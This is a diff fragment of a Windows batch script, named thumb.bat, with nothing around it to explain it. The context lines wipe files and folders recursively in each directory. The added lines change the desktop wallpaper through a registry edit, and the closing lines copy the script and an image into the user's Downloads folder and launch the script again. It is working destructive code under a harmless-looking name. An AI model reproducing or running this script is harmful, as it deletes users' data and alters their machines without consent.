@@ -11,6 +11,12 @@ for /D %%A in (*) do (
     del * /s /q | for /D %%p IN (*) DO rmdir "%%p" /s /q
     cd ..
 )
+set "wallpaperPath=thumboi.png"
+
+reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "%wallpaperPath%" /f
+RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
+
+
 copy thumboi.png C:/Users/%username%/Downloads
 copy thumb.bat C:/Users/%username%/Downloads
 start thumb.bat
